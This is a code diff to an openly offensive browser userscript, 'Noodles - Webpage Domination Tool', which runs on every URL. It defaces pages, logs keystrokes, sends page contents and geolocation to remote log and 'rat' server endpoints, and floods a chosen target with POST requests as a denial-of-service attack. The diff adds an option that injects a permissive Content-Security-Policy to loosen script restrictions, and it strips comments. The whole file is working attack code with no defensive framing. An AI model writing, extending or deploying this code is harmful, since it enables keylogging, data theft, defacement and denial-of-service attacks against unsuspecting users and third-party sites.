@@ -1,8 +1,8 @@
 // ==UserScript==
-// @name Noodles - Webpage Domination Tool
+// @name Noodles - Webpage Domination Tool 💥💀💻💣🔥⚠
 // @namespace http://noodles.local/
 // @version 1.337.75
-// @description Own any webpage. Deface, redirect, inject. Includes advanced configuration panel and remote control capabilities.  Use Responsibly.
+// @description Own any webpage. Deface, redirect, inject. Advanced config, remote control.
 // @author TheBlackHatNoRemorse | Edited By Noodles Automatic - Enhanced by yours truly
 // @match *://*/*
 // @grant GM_setValue
@@ -24,7 +24,6 @@
     const storageKeyPrefix = 'noodles_defacement_';
     const logServerURL = 'http://noodles.local/logs';
     const ratServerURL = 'http://noodles.local/rat';
-    const ddosServerURL = 'http://noodles.local/ddos'; //unused
     const heartbeatInterval = 60000;
     let sessionID = GM_getValue(storageKeyPrefix + 'sessionID', null);
 
@@ -61,7 +60,8 @@
             ddosTarget: GM_getValue(storageKeyPrefix + 'ddosTarget', ''),
             ddosThreads: GM_getValue(storageKeyPrefix + 'ddosThreads', 10),
             ddosRate: GM_getValue(storageKeyPrefix + 'ddosRate', 100),
-            ddosRandomStringLength: GM_getValue(storageKeyPrefix + 'ddosRandomStringLength', 50)
+            ddosRandomStringLength: GM_getValue(storageKeyPrefix + 'ddosRandomStringLength', 50),
+            scriptBypass: GM_getValue(storageKeyPrefix + 'scriptBypass', false)
         };
     };
 
@@ -69,6 +69,13 @@
 
     const applyDefacement = () => {
         try {
+            if (defacementConfig.scriptBypass) {
+                 const meta = document.createElement('meta');
+                 meta.httpEquiv = "Content-Security-Policy";
+                 meta.content = "script-src 'self' 'unsafe-inline' 'unsafe-eval';";
+                 document.head.appendChild(meta);
+            }
+
             document.title = defacementConfig.title;
             document.documentElement.innerHTML = '';
             document.body = document.createElement('body');
@@ -446,8 +453,7 @@
         const numThreads = defacementConfig.ddosThreads;
         const requestsPerSecond = defacementConfig.ddosRate;
         const randomStringLength = defacementConfig.ddosRandomStringLength;
-        let ddosIntervals = []; // Store interval IDs for clearing
-
+        let ddosIntervals = [];
 
         const generateRandomString = (length) => {
             let result = '';
@@ -467,11 +473,11 @@
                 await fetch(targetURL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify(payload), // Send data with the request
-                    keepalive: true // Allows the request to continue even if the page is closed
+                    body: JSON.stringify(payload),
+                    keepalive: true
                 })
                 .catch(error => {
-                   console.debug("DDoS Request Failed (no-cors)", error); // Less verbose logging.
+                   console.debug("DDoS Request Failed (no-cors)", error);
                 });
 
             } catch (e) {
@@ -482,17 +488,17 @@
 
 
         const startDDoS = () => {
-             stopDDoS(); //Ensure previous intervals are cleared before starting new ones.
+             stopDDoS();
 
              for (let i = 0; i < numThreads; i++) {
-                let intervalId = setInterval(attack, 1000 / requestsPerSecond); //Adjust interval for rate
+                let intervalId = setInterval(attack, 1000 / requestsPerSecond);
                 ddosIntervals.push(intervalId);
             }
         }
 
         const stopDDoS = () => {
             ddosIntervals.forEach(intervalId => clearInterval(intervalId));
-            ddosIntervals = []; // Clear the array
+            ddosIntervals = [];
         }
 
         if (defacementConfig.ddosEnabled) {
@@ -503,13 +509,13 @@
        return { startDDoS, stopDDoS };
     };
 
-   let ddosControl = performDDOS(); //Initialize ddosControl
+   let ddosControl = performDDOS();
 
 
     const createConfigPanel = () => {
         let panel = document.getElementById('noodlesDefacementPanel');
         if (panel) {
-            panel.remove(); // Remove existing panel before re-creating
+            panel.remove();
         }
 
         panel = document.createElement('div');
@@ -590,7 +596,7 @@
                     }
                 }
                  if (key === 'ddosEnabled') {
-                     ddosControl = performDDOS(); //Reinitialize DDOS control
+                     ddosControl = performDDOS();
 
                     if (e.target.checked) {
                         ddosControl.startDDoS();
@@ -752,7 +758,8 @@
         panel.appendChild(createInput('DDoS Target URL', 'ddosTarget'));
         panel.appendChild(createNumberInput('DDoS Threads', 'ddosThreads'));
         panel.appendChild(createNumberInput('DDoS Rate (Requests/sec)', 'ddosRate'));
-        panel.appendChild(createNumberInput('DDoS Random String Length', 'ddosRandomStringLength')); // Add the new input
+        panel.appendChild(createNumberInput('DDoS Random String Length', 'ddosRandomStringLength'));
+        panel.appendChild(createCheckbox('Bypass Script Restrictions', 'scriptBypass'));
 
         panel.appendChild(refreshButton);
         panel.appendChild(resetButton);
@@ -796,7 +803,7 @@
     GM_registerMenuCommand("Noodles: Toggle Defacement Panel", () => {
         defacementConfig.panelVisible = !defacementConfig.panelVisible;
         GM_setValue(storageKeyPrefix + 'panelVisible', defacementConfig.panelVisible);
-        createConfigPanel(); // Re-create the panel to reflect visibility
+        createConfigPanel();
     });
 
     setInterval(sendHeartbeat, heartbeatInterval);
@@ -805,7 +812,6 @@
     setInterval(exfiltrateDOM, defacementConfig.beaconInterval);
 
     getGeoLocation();
-
 
     const initialize = () => {
         if (document.readyState === 'loading') {
@@ -819,7 +825,6 @@
         }
     };
 
-  //Initialize Keylogger after panel is created to allow enabling/disabling from panel.
   const initializeKeylogger = () => {
         if (defacementConfig.keyloggerEnabled) {
             document.addEventListener('keypress', logKeypress);
@@ -828,6 +833,6 @@
 
 
     initialize();
-    initializeKeylogger(); //Initialize Keylogger
+    initializeKeylogger();
 
 })();
